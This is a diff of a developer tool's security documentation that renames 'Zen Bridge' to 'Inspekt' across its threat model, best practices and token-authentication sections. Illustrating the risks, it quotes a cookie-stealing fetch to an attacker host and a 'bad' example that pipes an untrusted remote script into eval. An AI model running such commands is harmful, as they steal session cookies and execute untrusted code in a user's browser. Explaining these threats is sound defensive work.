@@ -1,10 +1,10 @@
 # Security
 
-Security considerations, threat model, and best practices for Zen Bridge.
+Security considerations, threat model, and best practices for Inspekt.
 
 ## Overview
 
-Zen Bridge is a **local development tool** with a pragmatic security model designed for trusted development environments.
+Inspekt is a **local development tool** with a pragmatic security model designed for trusted development environments.
 
 ### Core Principles
 
@@ -36,7 +36,7 @@ These threats are relevant and mitigated:
 
 ```bash
 # Attacker tricks user into running malicious script
-zen eval "fetch('https://attacker.com/steal?cookies=' + document.cookie)"
+inspekt eval "fetch('https://attacker.com/steal?cookies=' + document.cookie)"
 ```
 
 **Defense**: User education - only run trusted scripts
@@ -112,7 +112,7 @@ These threats are explicitly out of scope:
 
 **Separate concern**: Browser security is vendor responsibility.
 
-- ✅ Zen Bridge relies on browser sandboxing
+- ✅ Inspekt relies on browser sandboxing
 - ✅ No additional browser security bypass
 - ✅ Keep browser updated (user responsibility)
 
@@ -172,12 +172,12 @@ WebSocket traffic is **unencrypted** (`ws://` instead of `wss://`).
 
 ```bash
 # User must explicitly run commands
-zen eval "document.title"        # Explicit
-zen exec script.js               # Explicit
-zen extract-links                # Explicit
+inspekt eval "document.title"        # Explicit
+inspekt exec script.js               # Explicit
+inspekt extract-links                # Explicit
 
 # No automatic execution on server start
-zen server start  # Only starts server, no code execution
+inspekt server start  # Only starts server, no code execution
 ```
 
 **Properties**:
@@ -272,13 +272,13 @@ Request abc-123: completed (success)
 ```bash
 # ✅ Good: Review script first
 cat my_script.js
-zen exec my_script.js
+inspekt exec my_script.js
 
 # ✅ Good: Understand inline code
-zen eval "document.querySelectorAll('a').length"
+inspekt eval "document.querySelectorAll('a').length"
 
 # ❌ Bad: Run unknown script
-curl https://untrusted.com/script.js | zen eval  # DON'T!
+curl https://untrusted.com/script.js | inspekt eval  # DON'T!
 ```
 
 #### 2. Review Scripts Before Execution
@@ -307,7 +307,7 @@ This would allow **remote code execution** in your browser.
 
 ```bash
 # Check version
-zen eval "window.__ZEN_BRIDGE_VERSION__"
+inspekt eval "window.__ZEN_BRIDGE_VERSION__"
 # Current version: 3.4
 ```
 
@@ -317,10 +317,10 @@ Update when new versions are released for security fixes.
 
 ```bash
 # Stop when done
-zen server stop
+inspekt server stop
 
 # Check status
-zen server status
+inspekt server status
 ```
 
 If server isn't running, attack surface is eliminated.
@@ -401,7 +401,7 @@ When adding features:
 
 ### 1. Arbitrary JavaScript Execution
 
-**By design**: Zen Bridge executes arbitrary JavaScript.
+**By design**: Inspekt executes arbitrary JavaScript.
 
 **Implications**:
 
@@ -519,15 +519,15 @@ We follow responsible disclosure:
 
 ```bash
 # Server generates token on start
-zen server start
+inspekt server start
 # Server token: abc123xyz
 
 # CLI uses token
-zen eval "code" --token abc123xyz
+inspekt eval "code" --token abc123xyz
 
 # Or environment variable
 export ZEN_BRIDGE_TOKEN=abc123xyz
-zen eval "code"
+inspekt eval "code"
 ```
 
 **Benefits**:
@@ -583,7 +583,7 @@ async def handle_http_run(request):
 
 ```bash
 # Enable
-zen config set audit.enabled true
+inspekt config set audit.enabled true
 
 # Log format
 [2025-10-27 10:30:45] EVAL "document.title" -> "Example"
@@ -601,7 +601,7 @@ zen config set audit.enabled true
 **Proposal**: Detect and warn about CSP.
 
 ```bash
-zen eval "fetch('https://api.example.com')"
+inspekt eval "fetch('https://api.example.com')"
 # Warning: Page has CSP that may block fetch
 # CSP: default-src 'self'
 ```
@@ -629,7 +629,7 @@ Before merging:
 
 ## Summary
 
-Zen Bridge security model:
+Inspekt security model:
 
 **Core Principles**:
 
